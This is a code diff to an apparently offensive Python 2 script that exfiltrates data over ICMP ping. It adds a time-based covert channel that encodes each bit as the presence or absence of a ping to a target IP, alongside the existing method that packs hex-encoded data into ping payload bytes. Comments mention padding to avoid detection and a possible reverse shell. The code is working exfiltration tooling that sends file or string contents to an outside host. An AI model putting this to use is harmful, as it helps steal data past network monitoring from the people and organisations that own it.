@@ -1,8 +1,10 @@
 import os, sys, base64
+from time import sleep
 
 # different methods of exfiltration:
 # - time-based (server and client pre-establish time diff, maybe pattern)
-# - Timestamp-binary
+# - Timestamp-binary (different length, so easily seen, maybe packets can
+#   be modified so that length is the same with padding)
 # - data-based (remaining bytes - more noisy)
 #
 # maybe option to add a reverse shell: server on client, receives
@@ -15,7 +17,8 @@ def dataFile(filename):
 
     return content
 
-def exfiltrate(data, ip):
+# - data-based (remaining bytes - more noisy)
+def exfiltrateLastBytes(data, ip):
 
     # add final signal to stop receiving data
     string = base64.b64encode(data).encode("hex") + "0a"
@@ -30,7 +33,24 @@ def exfiltrate(data, ip):
 
     # send blocks one by one
     for i in blocks:
-        os.system("ping -c1 -p {} {}".format(i, ip))
+        os.system("ping -c1 -p {} {} > /dev/null".format(i, ip))
+
+# - time-based (send in time sequence)
+def exfiltrateTimeBased(data, ip):
+
+    seq = bin(int((data).encode("hex"), 16))
+
+    print "[*] Sending encoded message: \"{}\"".format(data)
+
+    for i in seq[2:]:
+        sleep(.1)
+        if int(i):
+            os.system("ping -c1 {} > /dev/null".format(ip))
+        else:
+            sleep(.1)
+
+    print "[*] Message sent to {}".format(ip)
+    os.system("ping -c1 -p {} {} > /dev/null".format("0a", ip))
 
 if __name__ == "__main__":
 
@@ -44,4 +64,5 @@ if __name__ == "__main__":
         # if file flag is set:
         #   data = dataFile(data)
 
-        exfiltrate(data, ip)
+        # exfiltrateLastBytes(data, ip)
+        exfiltrateTimeBased(data, ip)
